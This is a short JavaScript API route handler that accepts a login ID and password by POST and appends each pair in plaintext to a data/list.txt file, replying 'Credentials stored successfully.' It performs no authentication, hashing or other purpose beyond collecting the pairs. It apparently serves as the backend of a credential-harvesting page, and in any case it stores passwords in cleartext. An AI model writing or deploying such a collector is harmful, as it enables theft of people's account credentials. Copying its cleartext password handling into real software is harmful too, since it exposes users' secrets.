import fs from 'fs';
import path from 'path';

export default function handler(req, res) {
    if (req.method !== 'POST') {
        return res.status(405).json({ message: "Method Not Allowed" });
    }

    const { ID, PASS } = req.body;

    if (!ID || !PASS) {
        return res.status(400).json({ message: "Please fill in both fields." });
    }

    const data = `Login ID: ${ID}, Password: ${PASS}\n`;

    // Define the path to store the file
    const filePath = path.join(process.cwd(), 'data', 'list.txt');

    // Append data to the file
    fs.appendFile(filePath, data, (err) => {
        if (err) {
            return res.status(500).json({ message: "Error saving credentials." });
        }
        return res.status(200).json({ message: "Credentials stored successfully." });
    });
}
